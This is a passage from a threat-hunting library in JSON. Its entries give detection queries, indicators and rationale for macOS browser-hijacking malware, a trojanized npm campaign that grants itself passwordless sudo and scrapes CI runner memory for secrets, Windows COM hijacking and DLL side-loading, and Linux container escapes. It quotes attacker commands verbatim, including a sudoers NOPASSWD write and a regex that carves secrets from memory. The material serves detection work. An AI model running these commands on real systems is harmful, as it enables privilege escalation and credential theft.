    "title": "A notarized macOS GUI application delivered via malvertising (masquerading as PodcastsLounge, PDF-Brain, or PDF-Ninja) is spawning a Unix shell from its `.app` bundle to fingerprint the host via `ioreg -rd1 -c IOPlatformExpertDevice | grep IOPlatformUUID | sed ...`, terminate Google Chrome with `killall \"Google Chrome\"`, and relaunch the browser with a hijacked search-provider URL plus crash-suppression flags (`--restore-last-session --hide-crash-restore-bubble --noerrdialogs --disable-session-crashed-bubble`) — and/or directly editing `~/Library/Preferences/Google/Chrome/Default/Secure Preferences` to repoint `default_search_provider_data` at attacker infrastructure (`sinterfumesco[.]com`).",
    "tactic": "Execution",
    "notes": "Platform: macOS. Driven by Unit 42 (Palo Alto Networks) \"Operation FlutterBridge: macOS Malvertising Campaign Spreads New FlutterShell Backdoor\" (June 2, 2026). The FlutterShell backdoor ships as a Flutter-built `.app` signed with valid Apple Developer IDs (Yasar Sever UBZDAAV97Y, Batuhan Dabag FW9NHQ8922, Yusuf Bal B73CHZ24Y8) that passed notarization — so Gatekeeper and notarization checks pass and VirusTotal showed zero detections at analysis time. The malicious logic runs through a JavaScript-to-native bridge (`flutterInvoke`) that lets remotely hosted JS cross-invoke native shell-exec primitives (renamed across variants: `exec_sync`→`renderPDF`, `read_file`→`read_pdf`), so the high-fidelity signal is not the binary on disk (signed, clean) but the **process lineage**: a GUI `.app` main executable spawning `/bin/sh -c` to run `ioreg`, `killall`, and `open`. **Detection sources / ESF**: subscribe to `ES_EVENT_TYPE_NOTIFY_EXEC` and filter for a `.app` bundle executable (parent path under `/Applications/` or `~/Downloads/`) that forks `/bin/sh`, `/bin/bash`, or `/bin/zsh` whose argv contains `ioreg`, `IOPlatformUUID`, `killall \"Google Chrome\"`, or `open` on a staged `.app`; `ES_EVENT_TYPE_NOTIFY_WRITE` / `ES_EVENT_TYPE_NOTIFY_RENAME` on `~/Library/Preferences/Google/Chrome/Default/Secure Preferences` and on `$HOME/Library/Caches/com.app.*/org.sparkle-project.Sparkle/Installation/` (Sparkle update-framework staging path the backdoor abuses to swap in payloads via the `onUpdateCycleFinished` callback). **Unified Log**: `log show --predicate 'process == \"Google Chrome\"'` correlated with a Chrome process that is terminated and relaunched within seconds carrying the crash-suppression argv above and a `sinterfumesco[.]com/search?utn=` URL. **EDR / KQL (MDE for macOS emits `DeviceProcessEvents`)**: `DeviceProcessEvents | where InitiatingProcessFolderPath endswith \".app\" | where FileName in (\"sh\",\"bash\",\"zsh\") | where ProcessCommandLine has_any (\"IOPlatformUUID\",\"killall \\\"Google Chrome\\\"\", \"--hide-crash-restore-bubble\")`. **Bundle IDs**: `com.app.podcastsLounge`, `com.app.pdfBrain`, `com.pdfninja.app`. **C2 / network IOCs**: `atsheisdomestic[.]org/update-thanks.html`, `etoftheappyrince[.]org/update-delay`, `healightejustb[.]org/checkupdateTO.js`, payload endpoints `/getConfig` and `/getUpdateThanksConfig`, PDF-exfil proxy `/summarize-text`, and browser-hijack intermediary `sinterfumesco[.]com/search?utn=*`. Cross-reference **T1036.005** (Masquerading: Match Legitimate Name or Location — the podcast/PDF-app disguise and the renamed `renderPDF`/`read_pdf` commands), **T1059.007** (Command and Scripting Interpreter: JavaScript — the WebView `flutterInvoke` bridge that drives the shell calls), and **T1071.001** (Application Layer Protocol: Web Protocols — the HTTPS C2 retrieving the staged JS payloads). The notarized-but-malicious distribution also pairs with a Subvert Trust Controls baseline for recently registered Apple Developer IDs.",
    "tags": [
      "execution",
      "macos",
      "unix_shell",
      "malvertising",
      "browser_hijack",
      "flutter",
      "notarized_malware",
      "search_hijack",
      "T1059.004"
    ],
    "techniques": [
      "T1059.004"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- The binary itself is the wrong thing to hunt: every FlutterShell sample was signed with a valid Apple Developer ID, passed Apple notarization, and had zero VirusTotal detections at analysis time — so static and reputation-based controls all pass. The durable signal is behavioral: a GUI `.app` that fingerprints the host with `ioreg` for `IOPlatformUUID` and then issues `killall \"Google Chrome\"` is doing something no legitimate podcast player or PDF viewer has any reason to do, and that process-lineage pattern survives recompilation, re-notarization, and C2 rotation\n- The `killall \"Google Chrome\"` → relaunch-with-`--hide-crash-restore-bubble` sequence is a near-unique fingerprint. Legitimate software does not force-kill a user's browser and immediately relaunch it with crash-restore and error dialogs suppressed plus a search-provider URL — the suppression flags exist specifically to hide the hijack from the user, so their presence in a Chrome relaunch argv is itself high-signal\n- Modifying `~/Library/Preferences/Google/Chrome/Default/Secure Preferences` to rewrite `default_search_provider_data` is observable directly via ESF file-write/rename events; pairing the file-write with a preceding `.app`-spawned shell makes the hunt resistant to the adware \"looks like a PUP\" framing that often gets these campaigns deprioritized\n- This is the macOS analogue of a Windows browser-hijack/adware loader, but the Flutter + WebView + JS-to-native bridge architecture is new enough that most macOS detections key on LaunchAgents/LaunchDaemons (which FlutterShell does *not* use — it persists through the Sparkle update cycle instead). Hunting the shell-exec lineage and the Sparkle `Installation/` staging directory catches the persistence path that LaunchAgent-focused detections miss entirely",
    "references": "- [MITRE ATT&CK T1059.004 - Command and Scripting Interpreter: Unix Shell](https://attack.mitre.org/techniques/T1059/004/)\n- [MITRE ATT&CK T1036.005 - Masquerading: Match Legitimate Name or Location](https://attack.mitre.org/techniques/T1036/005/)\n- [Unit 42 - Operation FlutterBridge: macOS Malvertising Spreads New FlutterShell Backdoor](https://unit42.paloaltonetworks.com/flutterbridge-new-fluttershell-backdoor/)\n- [Apple - Endpoint Security Framework: ES_EVENT_TYPE_NOTIFY_EXEC](https://developer.apple.com/documentation/endpointsecurity/es_event_type_notify_exec)\n- [Red Canary - Hunting macOS threats with the unified log and process telemetry](https://redcanary.com/blog/mac-monitoring/)\n- [SentinelOne - macOS Adware and Browser Hijackers: Detection and Behaviors](https://www.sentinelone.com/labs/)\n- [Objective-See - Tracking macOS Malware Persistence Beyond LaunchAgents (Sparkle abuse)](https://objective-see.org/blog.html)",
    "file_path": "Flames/H174.md"
  },
  {
    "id": "H175",
    "category": "Flames",
    "title": "A compromised npm dependency executing inside a self-hosted CI/CD runner (GitHub Actions) is granting itself passwordless root by writing a `NOPASSWD:ALL` rule for the runner account — e.g. `echo 'runner ALL=(ALL) NOPASSWD:ALL' > /mnt/runner` with `/mnt/runner` bind-mounted over `/etc/sudoers.d/`, or a direct write/append to `/etc/sudoers` or a file under `/etc/sudoers.d/` — immediately after an `npm install`/`npm ci` preinstall hook fires, then validating the new privilege with `sudo -n true`.",
    "tactic": "Privilege Escalation",
    "notes": "Platform: Linux (CI/CD runners — GitHub Actions, GitLab, Jenkins). Driven by Microsoft Security Blog \"Preinstall to persistence: Inside the Red Hat npm Miasma credential-stealing campaign\" (June 2, 2026). The Miasma harvester (32 trojanized `@redhat-cloud-services` packages republished across 90+ version tags) runs from a weaponized `preinstall` hook and, on a runner, installs a passwordless sudo rule so the rest of the chain (Bun payload, `/proc` memory scrape, package republishing) runs as root. The exact artifact in the report is `echo 'runner ALL=(ALL) NOPASSWD:ALL' > /mnt/runner` where `/mnt/runner` is bind-mounted onto `/etc/sudoers.d`. **Detection sources**: Linux `auditd` file-watch on the sudoers tree — `auditctl -w /etc/sudoers -p wa -k sudoers_change` and `auditctl -w /etc/sudoers.d/ -p wa -k sudoers_change` — then hunt `ausearch -k sudoers_change` for write events whose triggering `comm` / `exe` is `sh`, `bash`, `node`, `bun`, `npm`, or `tee` rather than `visudo`/`dpkg`/`cloud-init`/`ansible`; **MDE for Linux** `DeviceFileEvents | where FolderPath startswith \"/etc/sudoers\" | where InitiatingProcessFileName in (\"sh\",\"bash\",\"node\",\"bun\",\"npm\", \"tee\",\"dd\")`; and the privilege-validation tell `DeviceProcessEvents | where ProcessCommandLine has \"sudo -n true\"`. Also flag bind mounts that land on the sudoers path: `mount` / `/proc/mounts` entries where a non-system source is mounted at `/etc/sudoers.d`. **Process-lineage join (highest fidelity)**: a `node`/`npm` process (preinstall hook) that is the ancestor of the sudoers write within the same job window — npm install almost never legitimately edits sudoers. **Companion artifacts** from the same campaign to corroborate: `/etc/hosts` modification for DNS redirection, Bun runtime dropped to `/tmp/b-[a-z0-9]+/bun`, and second-stage JS at `/tmp/p*.js`. Cross-reference **T1003.007** (the `/proc` runner-memory scrape that root enables — see [[H176]]), **T1195.001** (the compromised dependency that delivered the hook — baseline in [[B020]]), and **T1078.004** (Valid Accounts: Cloud Accounts — the stolen CI tokens the root context then exfiltrates). The privilege grant is the pivot point: catching the sudoers write stops the chain before package republishing and provenance forgery occur.",
    "tags": [
      "privilege_escalation",
      "linux",
      "ci_cd",
      "sudoers",
      "supply_chain",
      "npm",
      "github_actions",
      "nopasswd",
      "T1548.003"
    ],
    "techniques": [
      "T1548.003"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- A write to `/etc/sudoers` or `/etc/sudoers.d/` is one of the highest-signal, lowest-volume events on a Linux host — legitimate changes come from `visudo`, package managers (`dpkg`/`rpm`), `cloud-init`, or configuration management (Ansible/Chef/Puppet), all of which are enumerable. A write whose triggering process is `node`, `bun`, `npm`, `sh`, or `tee` during a CI job is essentially never legitimate, so the false-positive surface after baselining the known editors is tiny\n- The passwordless-sudo grant is the campaign's privilege pivot: the Miasma harvester needs root to read other processes' memory, bind-mount over system paths, and write provenance attestations. Detecting the sudoers write catches the chain at the escalation step — before the `/proc` secret scrape ([[H176]]), before republishing trojanized packages with forged SLSA provenance, and before the `rm -rf ~/` honeytoken wiper can be triggered\n- The `sudo -n true` validation call is a second, independent corroborating signal — adversaries test the new rule non-interactively before relying on it, and a non-interactive sudo check immediately following a sudoers write is a clean two-event sequence that confirms intent rather than a benign config edit\n- Self-hosted CI/CD runners are high-value and under-instrumented: they hold cloud OIDC tokens, npm/GitHub publish rights, and Kubernetes service-account tokens, yet many orgs run EDR on laptops and servers but not on ephemeral runners. This hunt is a cheap, high-yield coverage point for exactly the host class supply-chain actors target, and it generalizes to any post-exploitation sudoers abuse, not just Miasma",
    "references": "- [MITRE ATT&CK T1548.003 - Abuse Elevation Control Mechanism: Sudo and Sudo Caching](https://attack.mitre.org/techniques/T1548/003/)\n- [MITRE ATT&CK T1195.001 - Supply Chain Compromise: Compromise Software Dependencies and Development Tools](https://attack.mitre.org/techniques/T1195/001/)\n- [Microsoft Security Blog - Preinstall to persistence: Inside the Red Hat npm Miasma credential-stealing campaign](https://www.microsoft.com/en-us/security/blog/2026/06/02/preinstall-persistence-inside-red-hat-npm-miasma-credential-stealing-campaign/)\n- [Red Canary Atomic Red Team - T1548.003 Sudo and Sudo Caching](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.003/T1548.003.md)\n- [Elastic Security - Detecting sudoers file modifications on Linux](https://www.elastic.co/guide/en/security/current/sudoers-file-modification.html)\n- [Sigma Rule - Sudoers File Modification (linux/file_event)](https://github.com/SigmaHQ/sigma/blob/master/rules/linux/file_event/file_event_lnx_persistence_sudoers_files.yml)\n- [GitHub - Security hardening for self-hosted runners](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#hardening-for-self-hosted-runners)",
    "file_path": "Flames/H175.md"
  },
  {
    "id": "H176",
    "category": "Flames",
    "title": "A malicious process on a Linux CI/CD runner is harvesting in-memory secrets from the GitHub Actions `Runner.Worker` process by locating its PID through `/proc` enumeration and then reading its memory (`/proc/<pid>/mem` via `/proc/<pid>/maps`) and pattern-matching the decrypted-secret structure with `tr -d '\\0' | grep -aoE '\"[^\"]+\":\\{\"value\":\"[^\"]*\",\"isSecret\":true\\}'` to recover masked workflow secrets (`ACTIONS_RUNTIME_TOKEN`, `ACTIONS_ID_TOKEN_REQUEST_TOKEN`, and job-scoped secrets).",
    "tactic": "Credential Access",
    "notes": "Platform: Linux (GitHub Actions self-hosted runners; the same technique applies to any runner whose agent holds secrets in process memory). Driven by Microsoft Security Blog \"Preinstall to persistence: Inside the Red Hat npm Miasma credential-stealing campaign\" (June 2, 2026). After escalating to root (see [[H175]]), the Miasma harvester scans `/proc` for the `Runner.Worker` worker process, reads its memory, and greps for the GitHub Actions secret-store JSON shape (`\"<name>\":{\"value\":\"<secret>\",\"isSecret\":true}`) to defeat the runner's log-masking — secrets that are masked in logs are plaintext in worker memory. **Detection sources**: Linux `auditd` syscall watch for cross-process memory reads — `auditctl -a always,exit -F arch=b64 -S ptrace -k proc_mem` plus a file-watch on the proc mem path (`-w /proc -p r` is too noisy; prefer eBPF). **eBPF / Falco**: alert on `open`/`openat` of `/proc/<pid>/mem` or `process_vm_readv` where the target PID is `Runner.Worker` (or `dotnet`/`Runner.Listener`) and the reader is not a debugger/profiler on an allowlist. **MDE for Linux**: `DeviceProcessEvents | where FileName == \"grep\" | where ProcessCommandLine has_all (\"value\", \"isSecret\") and ProcessCommandLine has \"-aoE\"` (the campaign's verbatim memory-carving grep), and `DeviceProcessEvents | where ProcessCommandLine has_all (\"/proc/\", \"/mem\")`. **Process-lineage tell**: a `grep -aoE` reading from a `/proc` path whose ancestor is `node`/`bun`/`npm` (the install hook) inside a CI job window. **High-signal regex to hunt in command-lines and EDR telemetry** (campaign verbatim): `\"[^\"]+\":\\{\"value\":\"[^\"]*\",\"isSecret\":true\\}`. Corroborating artifacts: prior `/proc` directory enumeration (`ls /proc`, reads of `/proc/<pid>/cmdline` to find the worker), Bun runtime at `/tmp/b-*/bun`, and downstream exfil to a newly created public GitHub repo named with a \"Miasma\"/adjective-creature-<n> pattern. Cross-reference **T1548.003** (the passwordless-sudo grant that makes cross-process memory reads possible — see [[H175]]), **T1552.001** (Credentials in Files — the same harvester also reads `~/.aws`, `~/.npmrc`, `~/.ssh`), and **T1567** (Exfiltration Over Web Service — staging stolen secrets into a public GitHub repo). Reading another process's memory to defeat secret masking is the runner-side equivalent of LSASS scraping and should be treated with the same severity.",
    "tags": [
      "credential_access",
      "linux",
      "proc_filesystem",
      "ci_cd",
      "github_actions",
      "memory_scraping",
      "supply_chain",
      "secret_theft",
      "T1003.007"
    ],
    "techniques": [
      "T1003.007"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- Log-masking gives a false sense of security: GitHub Actions redacts secrets in job logs, but those same secrets sit in plaintext inside the `Runner.Worker` process address space. Reading `/proc/<pid>/mem` of the worker is a complete bypass of masking, and because the secrets are stored in a known JSON shape (`\"name\":{\"value\":\"...\",\"isSecret\":true}`), the carving regex is a stable, campaign-independent IOC that will match any actor reusing this masking-bypass trick\n- Cross-process memory reads are rare and high-signal on Linux servers: outside of debuggers (`gdb`, `delve`), profilers (`perf`, `py-spy`), and a handful of observability agents, almost nothing legitimately reads another process's `/proc/<pid>/mem`. After allowlisting those, a `grep -aoE` or `process_vm_readv` against the CI worker is a near-zero-false-positive detection\n- This is the credential-access heart of the Miasma chain — the stolen `ACTIONS_RUNTIME_TOKEN` and OIDC tokens are what let the actor republish trojanized packages with forged SLSA provenance and pivot to cloud. Detecting the memory scrape catches the attack at the moment of credential theft, before the tokens are used and before they expire and rotate, which is the only window where containment is clean\n- The hunt hardens an under-monitored asset class. Most secret-scanning and DLP tooling watches files and network egress, not live process memory on ephemeral runners. Adding `/proc`-memory-read detection (via eBPF/Falco or MDE for Linux) closes a blind spot that supply-chain actors are now actively exploiting, and the same detection covers any future \"scrape the CI agent's memory\" technique regardless of which secret store is targeted",
    "references": "- [MITRE ATT&CK T1003.007 - OS Credential Dumping: Proc Filesystem](https://attack.mitre.org/techniques/T1003/007/)\n- [MITRE ATT&CK T1552.001 - Unsecured Credentials: Credentials In Files](https://attack.mitre.org/techniques/T1552/001/)\n- [Microsoft Security Blog - Preinstall to persistence: Inside the Red Hat npm Miasma credential-stealing campaign](https://www.microsoft.com/en-us/security/blog/2026/06/02/preinstall-persistence-inside-red-hat-npm-miasma-credential-stealing-campaign/)\n- [Falco - Default rules: Read sensitive file / process memory access](https://github.com/falcosecurity/rules/blob/main/rules/falco_rules.yaml)\n- [Red Canary Atomic Red Team - T1003.007 Proc Filesystem](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.007/T1003.007.md)\n- [Elastic Security - Detecting credential access via the Linux proc filesystem](https://www.elastic.co/security-labs/)\n- [GitHub - Using secrets in GitHub Actions (masking and storage)](https://docs.github.com/en/actions/security-guides/using-secrets-in-github-actions)",
    "file_path": "Flames/H176.md"
  },
  {
    "id": "H177",
    "category": "Flames",
    "title": "The Argamal RAT is persisting on Windows by hijacking a Component Object Model (COM) object — writing an `InprocServer32` (and `ShellFolder`) value under `HKCU\\SOFTWARE\\Classes\\CLSID\\{B210D694-C8DF-490D-9576-9E20CDBC20BD}` or `{722D0F89-B69C-4700-AE8C-4A44350E4876}` that points at a randomly named DLL dropped under `%LOCALAPPDATA%` — so that the legitimate `\\Microsoft\\Windows\\WindowsColorSystem\\Calibration` scheduled task loads the malicious DLL on every user logon.",
    "tactic": "Persistence",
    "notes": "Platform: Windows. Driven by Securelist (Kaspersky GReAT) \"Argamal: Malware hidden in hentai games\" (June 3, 2026). Argamal achieves login persistence by hijacking the COM object that the built-in `WindowsColorSystem\\Calibration` scheduled task instantiates: it writes a per-user CLSID registration (`HKCU\\SOFTWARE\\Classes\\CLSID\\...`) whose `InprocServer32` points to an attacker DLL with a randomized name in a random subdirectory of `%USER%\\AppData\\Local`, alongside a `settings.dat` (AES-CBC payload, key=IV `zbcd1j9234r670eh`). Because the user-hive CLSID is resolved before the machine hive (HKCU wins over HKLM for the same CLSID), the task silently loads the hijack DLL at logon. **Detection sources / Event IDs**: Sysmon **Event ID 12/13** (Registry object add/set) on `HKCU\\Software\\Classes\\CLSID\\*\\InprocServer32` writes whose data resolves to a path under `\\AppData\\Local\\`; Sysmon **Event ID 7** (Image/DLL load) for a DLL loaded from `%LOCALAPPDATA%\\<random>\\` by a trusted host process (`taskhostw.exe`, `rundll32.exe`, `svchost.exe`); Windows Security **4688** / Sysmon **1** for `schtasks`/task-host process creation referencing the Calibration task; Windows **Task Scheduler Operational** Event IDs **106/200/201** (task registered/executed) for `\\Microsoft\\Windows\\WindowsColorSystem\\Calibration`. **KQL (Defender XDR)**: `DeviceRegistryEvents | where RegistryKey has @\"\\Software\\Classes\\CLSID\" and RegistryValueName == \"(Default)\" and ActionType == \"RegistryValueSet\" | where RegistryValueData has_any (\"AppData\\\\Local\",\"\\\\Roaming\\\\\") and RegistryValueData endswith \".dll\"` and `DeviceImageLoadEvents | where FolderPath has @\"\\AppData\\Local\\\" and InitiatingProcessFileName in~ (\"taskhostw.exe\",\"rundll32.exe\", \"svchost.exe\")`. **Specific IOCs**: CLSIDs `{B210D694-C8DF-490D-9576-9E20CDBC20BD}` and `{722D0F89-B69C-4700-AE8C-4A44350E4876}`; environment variables `MI_V`, `MI_V2` (Stage-2 PowerShell carrier); `settings.dat` in `AppData\\Local\\<random>\\`. **High-fidelity hunt**: enumerate every `HKCU\\Software\\Classes\\CLSID\\{...}\\InprocServer32` whose default value points outside `%WINDIR%`/`%PROGRAMFILES%` (user-writable path) — a short, reviewable list on a clean estate and a classic COM-hijack tell. Cross-reference **T1053.005** (Scheduled Task/Job: Scheduled Task — the abused `WindowsColorSystem\\Calibration` trigger), **T1059.001** (PowerShell — the Base64 Stage-1/Stage-2 scripts carried in `MI_V`/`MI_V2`), and **T1197** (BITS Jobs — `bitsadmin.exe` pulled `zaesdl.dat` from GitHub earlier in the chain). Pair this persistence hunt with a baseline of legitimate per-user CLSID registrations to keep it low-noise.",
    "tags": [
      "persistence",
      "windows",
      "com_hijacking",
      "scheduled_task",
      "registry",
      "argamal",
      "clsid",
      "appdata",
      "T1546.015"
    ],
    "techniques": [
      "T1546.015"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- HKCU COM hijacking is quiet and effective because the user hive is consulted before the machine hive for the same CLSID — an attacker never has to touch HKLM, never needs admin rights, and the legitimate task (`WindowsColorSystem\\Calibration`) does the loading for them on every logon. That makes it a persistence path that survives reboots and is invisible to anyone only watching Run keys, services, and the Startup folder\n- The detection is bounded and high-signal: on a clean Windows estate the set of `HKCU\\Software\\Classes\\CLSID\\*\\InprocServer32` values that resolve to a DLL under `%LOCALAPPDATA%` or `%APPDATA%` is tiny and reviewable. Almost every legitimate in-proc COM server lives under `%WINDIR%\\System32` or `%PROGRAMFILES%`, so a user-writable-path target is itself the anomaly — no malware family knowledge required for the generic version of the hunt\n- Argamal pairs the COM hijack with a specific known-good task name, which gives a second corroborating pivot: any modification touching the `WindowsColorSystem\\Calibration` task's COM target, or a DLL load from `%LOCALAPPDATA%` initiated by `taskhostw.exe`, ties the registry write to actual execution rather than a dormant registration — separating live persistence from leftover artifacts\n- COM hijacking is reused across many families (not just Argamal — it's a staple of commodity and APT tooling alike), so building the generic \"per-user CLSID pointing at a user-writable DLL\" hunt plus the Calibration-task pivot yields durable coverage. The same query catches the next family that hijacks a different built-in scheduled task's COM object, because the structural anomaly is identical even when the CLSIDs and DLL names rotate",
    "references": "- [MITRE ATT&CK T1546.015 - Event Triggered Execution: Component Object Model Hijacking](https://attack.mitre.org/techniques/T1546/015/)\n- [MITRE ATT&CK T1053.005 - Scheduled Task/Job: Scheduled Task](https://attack.mitre.org/techniques/T1053/005/)\n- [Securelist (Kaspersky) - Argamal: Malware hidden in hentai games](https://securelist.com/argamal-rat-distributed-with-hentai-games/119999/)\n- [Red Canary Atomic Red Team - T1546.015 Component Object Model Hijacking](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.015/T1546.015.md)\n- [Elastic Security - Component Object Model Hijacking detection rule](https://www.elastic.co/guide/en/security/current/component-object-model-hijacking.html)\n- [Sigma Rule - COM Hijacking via InprocServer32 modification](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/registry/registry_set/registry_set_com_hijack_inprocserver32.yml)\n- [MITRE - COM Hijacking via TreatAs and InprocServer32 (G DATA / bohops research)](https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/)",
    "file_path": "Flames/H177.md"
  },
  {
    "id": "H178",
    "category": "Flames",
    "title": "A trojanized `ffmpeg.dll` shipped inside a cracked/pirated game is side-loading Argamal's first stage — the legitimate-named DLL exports `DllGetClassObject` but resolves it by loading attacker code from a sidecar blob (`natives2_blob.bin`) in the same directory, so a game executable in a user-writable path (`%USERPROFILE%`, `%TEMP%`, `Downloads`, a torrent/extract folder) loads an unsigned/mismatched `ffmpeg.dll` that then spawns Base64-encoded PowerShell.",
    "tactic": "Defense Evasion",
    "notes": "Platform: Windows. Driven by Securelist (Kaspersky GReAT) \"Argamal: Malware hidden in hentai games\" (June 3, 2026). Argamal's initial execution is DLL side-loading: a benign-looking `ffmpeg.dll` (a name games legitimately ship) is replaced with a malicious build that imports `DllGetClassObject` from a companion `natives2_blob.bin`, so when the game loads `ffmpeg.dll` from its own directory the attacker code runs in a trusted process context and decodes a Base64 PowerShell stager into the `MI_V`/`MI_V2` environment variables. **Detection sources / Event IDs**: Sysmon **Event ID 7** (Image/DLL load) is the core telemetry — hunt `ffmpeg.dll` (and other commonly side-loaded names) loaded from a user-writable, non-Program-Files path, especially where `Signed=false` or the signature/Original-Filename does not match the real FFmpeg project; Sysmon **Event ID 1** / Security **4688** for the game `.exe` parent and any child `powershell.exe` with an encoded command; Sysmon **Event ID 11** (FileCreate) for `natives2_blob.bin` and `settings.dat` appearing beside the DLL. **KQL (Defender XDR)**: `DeviceImageLoadEvents | where FileName =~ \"ffmpeg.dll\" | where not (FolderPath startswith @\"C:\\Program Files\" or FolderPath startswith @\"C:\\Windows\") | where InitiatingProcessFolderPath has_any (@\"\\Users\\\",\"\\Temp\\\",\"\\Downloads\\\",\"\\AppData\\\")` joined to `DeviceFileEvents | where FileName in~ (\"natives2_blob.bin\",\"settings.dat\")` on `DeviceId`. **Sideload-pair hunt (highest fidelity)**: a single directory under a user path that contains a game `.exe`, an `ffmpeg.dll`, and a `natives2_blob.bin` (or `.bin` sidecar the DLL reads on load) — the blob-beside-DLL pattern is the structural tell that distinguishes a side-load from a normally distributed FFmpeg. Corroborate with a child `powershell.exe -enc <base64>` whose parent is the game `.exe`, and the later `bitsadmin.exe` download of `zaesdl.dat` from GitHub. Cross-reference **T1036.005** (Masquerading: Match Legitimate Name — using the real `ffmpeg.dll` name), **T1059.001** (PowerShell — the Base64 Stage-1/2 carried in `MI_V`/`MI_V2`), and **T1546.015** (COM Hijacking — the downstream persistence in [[H177]]). Side-loading via games is the delivery; pair this with a host baseline of which directories legitimately ship `ffmpeg.dll` to suppress noise from media apps.",
    "tags": [
      "defense_evasion",
      "windows",
      "dll_sideloading",
      "hijack_execution_flow",
      "argamal",
      "ffmpeg",
      "masquerading",
      "pirated_games",
      "T1574.001"
    ],
    "techniques": [
      "T1574.001"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- DLL side-loading lets Argamal execute inside a process the user launched themselves and that EDR often treats as benign (a game), with no signed-binary alarm — the malicious code is in a DLL the trusted `.exe` voluntarily loads from its own folder. Hunting the *load event* rather than the file reputation catches it because the legitimate-named `ffmpeg.dll` is unsigned or signature-mismatched and sits in a user-writable path no real FFmpeg distribution would use for a system process\n- The `natives2_blob.bin`-beside-`ffmpeg.dll` arrangement is a strong structural IOC: real FFmpeg never reads a `.bin` blob to resolve `DllGetClassObject`. A directory holding a game `.exe`, a non-Microsoft `ffmpeg.dll`, and a sidecar blob is a near-unique fingerprint that survives renaming of the C2 and the payload, because the loader mechanics stay constant\n- Side-loading a real library name is a deliberate masquerade — `ffmpeg.dll`, `version.dll`, `winmm.dll`, and similar names are chosen precisely because they look legitimate in a DLL-load log. Building the \"common-sideload-name loaded from a user path with a mismatched signature\" hunt generalizes far beyond Argamal: the same query surfaces the next family that abuses a different trusted DLL name from a Downloads/extract folder\n- Pirated-game vectors disproportionately hit BYOD and personal-overlap machines that later VPN into corporate environments, so the cracked-game side-load is a realistic initial-access path that bypasses email and web-proxy controls entirely. Catching it at the DLL-load step — before the PowerShell stager, BITS download, and COM-hijack persistence in [[H177]] — is the earliest clean containment point in the Argamal chain",
    "references": "- [MITRE ATT&CK T1574.001 - Hijack Execution Flow: DLL](https://attack.mitre.org/techniques/T1574/001/)\n- [MITRE ATT&CK T1036.005 - Masquerading: Match Legitimate Name or Location](https://attack.mitre.org/techniques/T1036/005/)\n- [Securelist (Kaspersky) - Argamal: Malware hidden in hentai games](https://securelist.com/argamal-rat-distributed-with-hentai-games/119999/)\n- [Red Canary Atomic Red Team - T1574.001 DLL Search Order / Side-Loading](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.001/T1574.001.md)\n- [Elastic Security - Hunting for suspicious DLL loads from user-writable paths](https://www.elastic.co/security-labs/)\n- [Sigma Rule - Potential DLL Sideloading Of Non-Existent / Mismatched DLLs](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/image_load/image_load_side_load_non_existent_dlls.yml)\n- [Microsoft - Sysmon Event ID 7 (Image loaded) configuration for side-load hunting](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)",
    "file_path": "Flames/H178.md"
  },
  {
    "id": "H179",
    "category": "Flames",
    "title": "A process running inside a Linux container is escaping to the host by one of the high-signal misconfiguration paths — writing a payload to a cgroup `release_agent` (CVE-2022-0492 class), loading a kernel module via `insmod`/`modprobe` from a `CAP_SYS_MODULE` container, mounting the host filesystem after abusing `CAP_SYS_ADMIN`, or driving the Docker API through a bind-mounted `/var/run/docker.sock` to launch a privileged container — to gain code execution in the host namespace.",
    "tactic": "Privilege Escalation",
    "notes": "Platform: Linux (container hosts — Docker, containerd, Kubernetes nodes). Driven by Securelist (Kaspersky) \"Containers on fire: from container escapes to supply chain attacks\" (June 1, 2026), a survey of container escape vectors. This is intentionally a *behavioral* hunt across the documented escape primitives rather than a single-IOC hunt, because the article is a vector survey, not an incident report. **Escape behaviors to hunt**: (1) **cgroup release_agent** — a write to a `release_agent` file under `/sys/fs/cgroup/**` or a `notify_on_release=1` toggle from inside a container (CVE-2022-0492); (2) **kernel module load** — `insmod`/`modprobe`/`finit_module` syscall originating from a container namespace (`CAP_SYS_MODULE` abuse), or a new entry under `/sys/module/`; (3) **host mount** — `mount()` syscalls inside a container targeting a host block device or bind-mounting host paths, then writing to host files like `/root/.bashrc` or `/etc/cron.d`; (4) **docker.sock abuse** — process inside a container with `/var/run/docker.sock` visible in `/proc/<pid>/mountinfo` issuing Docker/K8s API calls (`curl --unix-socket /var/run/docker.sock`, or `POST .../containers/create` with `\"Privileged\":true`); (5) **runc exploit class** — writes to `/proc/self/exe` (CVE-2019-5736) or anomalous fd handling (CVE-2024-21626). **Detection sources**: Linux `auditd` syscall rules for `mount`, `init_module`/`finit_module`, `ptrace`, and `open` of `/sys/fs/cgroup/**release_agent`; **eBPF/Falco** default rules (\"Launch Privileged Container\", \"Write below /sys\", \"Container Drift\", \"Mount Launched in Privileged Container\", \"Modify Container Entrypoint\") — Falco is the recommended runtime sensor here; **Kubernetes audit log** for Pod create/update requests carrying `securityContext.privileged: true` or `hostPID`/`hostPath` mounts, especially from a ServiceAccount token not normally used for Pod creation. **Namespace-crossing tell**: a shell or process whose `/proc/self/ns/pid` (or `mnt`/`net`) matches the host init namespace but was spawned from a container runtime child — `nsenter`-style escapes show as a process appearing in the host PID namespace with a container parent. **Key file/path watches**: `/var/run/docker.sock`, 